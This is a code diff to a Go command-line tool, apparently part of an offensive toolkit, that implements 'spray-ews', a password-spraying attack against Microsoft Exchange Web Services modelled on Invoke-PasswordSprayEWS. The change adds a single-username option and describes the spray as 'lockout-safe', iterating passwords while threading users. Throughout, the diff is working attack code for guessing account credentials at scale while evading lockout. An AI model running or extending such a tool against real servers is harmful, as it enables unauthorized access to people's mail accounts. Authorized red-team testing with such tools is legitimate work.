@@ -14,6 +14,7 @@ func newSprayEWSCmd() *cobra.Command {
 	var (
 		hostname     string
 		ewsURL       string
+		username     string
 		userList     string
 		password     string
 		passwordList string
@@ -28,18 +29,27 @@ func newSprayEWSCmd() *cobra.Command {
 	cmd := &cobra.Command{
 		Use:   "spray-ews",
 		Short: "Password spray against EWS (Invoke-PasswordSprayEWS)",
-		Long: `Attempts to authenticate to an EWS endpoint using a list of usernames
-and a single password (or a password list). A successful probe uses a lightweight
-FindItem request.
+		Long: `Attempts to authenticate to an EWS endpoint using one or more usernames
+and one or more passwords. A successful probe uses a lightweight FindItem request.
+Passwords are iterated sequentially (lockout-safe); users are threaded within each round.
 
 Equivalent to the PowerShell Invoke-PasswordSprayEWS function.`,
 		RunE: func(cmd *cobra.Command, args []string) error {
-			users, err := readLines(userList)
-			if err != nil {
-				return fmt.Errorf("read user list: %w", err)
+			// Build user list.
+			var users []string
+			var err error
+			if userList != "" {
+				users, err = readLines(userList)
+				if err != nil {
+					return fmt.Errorf("read user list: %w", err)
+				}
+			} else if username != "" {
+				users = []string{username}
+			} else {
+				return fmt.Errorf("provide --username or --user-list")
 			}
 
-			// Build password list: --password-list takes precedence over --password.
+			// Build password list.
 			var passwords []string
 			if passwordList != "" {
 				passwords, err = readLines(passwordList)
@@ -59,8 +69,8 @@ Equivalent to the PowerShell Invoke-PasswordSprayEWS function.`,
 				return fmt.Errorf("provide --hostname or --ews-url")
 			}
 
-			fmt.Printf("[*] Loaded %d users from %s\n", len(users), userList)
-			fmt.Printf("[*] Spraying EWS at %s with %d password(s)\n", ewsURL, len(passwords))
+			fmt.Printf("[*] Loaded %d user(s), %d password(s)\n", len(users), len(passwords))
+			fmt.Printf("[*] Spraying EWS at %s\n", ewsURL)
 			fmt.Printf("[*] Threads: %d | Delay: %dms\n", threads, delay)
 
 			type result struct {
@@ -122,6 +132,7 @@ Equivalent to the PowerShell Invoke-PasswordSprayEWS function.`,
 	f := cmd.Flags()
 	f.StringVar(&hostname, "hostname", "", "Exchange server hostname")
 	f.StringVar(&ewsURL, "ews-url", "", "Full EWS URL (overrides --hostname)")
+	f.StringVar(&username, "username", "", "Single username to spray")
 	f.StringVar(&userList, "user-list", "", "File with usernames (one per line)")
 	f.StringVar(&password, "password", "", "Single password to spray")
 	f.StringVar(&passwordList, "password-list", "", "File with passwords to spray (one per line)")
@@ -132,6 +143,5 @@ Equivalent to the PowerShell Invoke-PasswordSprayEWS function.`,
 	f.BoolVar(&skipTLS, "skip-tls", false, "Skip TLS certificate verification")
 	f.IntVar(&delay, "delay", 0, "Delay between requests per thread (milliseconds)")
 
-	_ = cmd.MarkFlagRequired("user-list")
 	return cmd
 }
